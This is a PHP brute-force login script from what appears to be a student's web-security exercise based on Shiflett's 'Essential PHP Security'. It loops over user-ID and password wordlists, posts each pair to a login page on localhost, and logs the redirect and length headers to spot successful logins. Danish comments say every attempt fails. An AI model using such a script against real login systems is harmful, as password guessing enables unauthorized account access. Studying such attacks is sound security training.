<?php
/*
 * Based on Chris Shiflett, Essential PHP Security, 2005, O'Reilly
 * Chapter 7
 */


/*
Min login0Auth.php er her:
C:\xampp\htdocs\Security\Sec.1.1

bruteforceattack.php er her:
C:\xampp\htdocs\Security\Sec.2.0

Jeg bruger den her komando i terminal:
php bruteforceattack.php -- localhost Security/Sec.1.1/login0Auth.php darkuids.txt darkpwds.txt darkresults.txt

Men jeg får noSuccess på alle forsøg, userid = nobody og pass = test
*/

if (count($argv) != 7) {
    $s = "php bruteforceattack.php -- localhost urlpath userids passwords results\n";
    $s .= "the latter three being filenames\n";
    die($s);
}

$host = $argv[2];
$url = $argv[3];
$ids = file_get_contents($argv[4]);
$idsa = explode("\n", $ids);
$pwds = file_get_contents($argv[5]);
$pwdsa = explode("\n", $pwds);
$results = $argv[6];

$http_header = '';
$http_header .= "POST /" . $url . " HTTP/1.1\r\n";
$http_header .= "Host: " . $host ."\r\n";
$http_header .= "Content-Type: application/x-www-form-urlencoded\r\n";
$http_header .= "Content-Length: %s\r\n";
$http_header .= "Connection: close\r\n";
$http_header .= "\r\n";

$s = '';
foreach($idsa as $uid) {
    foreach($pwdsa as $pwd) {
        $content  = 'user=';
        $content .= $uid;
        $content .= '&password=';
        $content .= $pwd;
        $request = $http_header . $content;
        $request = sprintf($request, strlen($content));
        $response = '';

        if ($handle = fsockopen('localhost', 80)) {
            fputs($handle, $request);
            while (!feof($handle)) {
                $response .= fgets($handle, 1024);
            }
            fclose($handle);
            /* Check response */
            //var_dump($response);
            preg_match('/Location: \S+/', $response, $m, PREG_OFFSET_CAPTURE);
            if (count($m))
                $s .= sprintf("\n%s %s", $content, $m[0][0]);
            preg_match('/Content-Length: \d+/', $response, $m, PREG_OFFSET_CAPTURE);
            if (count($m))
                $s .= sprintf("\n%s %s", $content, $m[0][0]);
        } else {
            /* Error in sockopen */
            die("WTF");
        }
        file_put_contents($results, $s);
    }
}
echo "\n";
?>